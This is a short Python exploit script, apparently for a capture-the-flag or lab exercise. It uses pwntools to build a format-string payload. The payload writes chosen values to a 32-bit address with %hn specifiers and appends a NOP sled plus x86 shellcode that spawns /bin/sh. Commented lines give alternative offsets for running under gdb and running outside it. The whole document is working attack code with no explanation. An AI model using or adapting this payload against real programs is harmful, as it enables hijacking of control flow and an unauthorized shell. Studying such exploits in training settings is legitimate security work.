from pwn import *

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

ex_add = 0x0804c018

cong = 0x8049213

val1 = p32(0x0804c018)
val2 = p32(0x0804c01a)
#0xffffbfb8
pay = val1 + "AAAA" + val2

#pay += "%X%X%X%X%X%X%X%X%X%X%37312X%hn%30193X%hn" #cong
#pay += "%X%X%X%X%X%X%X%X%X%X%49004X%hn%16455X%hn" + '\x90' * 100 + shellcode # shell via buff gdb
pay += "%X%X%X%X%X%X%X%X%X%X%49172X%hn%16287X%hn" + '\x90' * 100 + shellcode # shell via buff external

print(pay)
